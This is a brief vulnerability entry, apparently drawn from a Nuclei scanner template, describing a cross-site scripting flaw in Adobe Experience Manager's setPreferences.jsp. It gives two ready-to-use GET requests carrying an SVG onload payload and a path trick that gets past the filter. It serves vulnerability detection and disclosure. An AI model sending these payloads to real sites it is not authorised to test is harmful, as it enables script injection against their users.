# Nuclei Template: Adobe Experience Manager - Cross-Site Scripting
**Template ID:** aem-setpreferences-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** High
**CWE:** CWE-79
**Source:** Nuclei Template (`aem-setpreferences-xss.yaml`)

## Vulnerability Information & PoC

## Description
Adobe Experience Manager contains a cross-site scripting vulnerability via setPreferences.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/crx/de/setPreferences.jsp;%0A.html?language=en&keymap=<svg/onload=confirm(document.domain);>//a
GET {{BaseURL}}/content/crx/de/setPreferences.jsp;%0A.html?language=en&keymap=<svg/onload=confirm(document.domain);>//a
```

## References
- https://www.youtube.com/watch?v=VwLSUHNhrOw&t=142s
- https://github.com/projectdiscovery/nuclei-templates/issues/3225
- https://twitter.com/zin_min_phyo/status/1465394815042916352
